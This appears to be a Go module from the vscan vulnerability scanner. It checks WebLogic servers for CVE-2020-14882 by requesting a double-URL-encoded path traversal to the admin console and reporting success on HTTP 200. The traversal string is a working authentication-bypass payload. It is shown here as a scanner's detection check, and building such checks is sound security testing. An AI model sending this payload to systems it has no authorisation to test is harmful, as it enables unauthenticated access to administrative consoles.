package weblogic

import (
	"fmt"
	"github.com/veo/vscan/poc"
)

func CVE_2020_14882(url string) bool {
	if req, err := poc.HttpRequset(url+"/console/css/%252e%252e%252fconsole.portal", "GET", ""); err == nil {
		if req.StatusCode == 200 {
			fmt.Printf("weblogic-exp-sucess|CVE_2020_14882|%s\n", url)
			return true
		}
	}
	return false
}
